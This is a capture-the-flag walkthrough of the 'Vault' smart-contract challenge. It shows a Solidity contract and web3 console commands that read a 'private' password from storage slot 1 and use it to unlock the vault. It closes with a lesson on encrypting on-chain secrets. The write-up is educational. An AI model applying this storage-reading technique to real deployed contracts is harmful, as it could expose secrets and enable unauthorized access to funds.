# Vault

## Challenge Description

Unlock the vault to pass the level!

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

## Challenge Solution Walkthrough

In this challenge, the goal is to unlock a contract by accessing the `password` variable, even though it is marked as `private`. In Solidity, marking a variable as `private` does not prevent others from accessing its value using low-level functions like `getStorageAt()`.

To access the `password` variable, we can use the `web3.eth.getStorageAt()` function in the console. This function allows us to read the value stored at a specific storage slot in the contract's memory.

To retrieve the `password` variable, we run the following code in the console:

```javascript
> const password = await web3.eth.getStorageAt(contract.address, 1)
> password
< '0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
```

The resulting value is a hexadecimal string representing the `password`. We can then use this value to unlock the vault by calling the `unlock()` function with the obtained `password`:

```javascript
> await contract.unlock(password)
```

To verify that we have successfully unlocked the vault, we can check the value of the `locked()` function:

```javascript
> (await contract.locked()) == false
< true
```

If the returned value is `true`, it means we have successfully unlocked the vault.

Congratulations! You have successfully completed the challenge.

## Challenge Description After Solving

It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. [zk-SNARKs](https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/) provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.
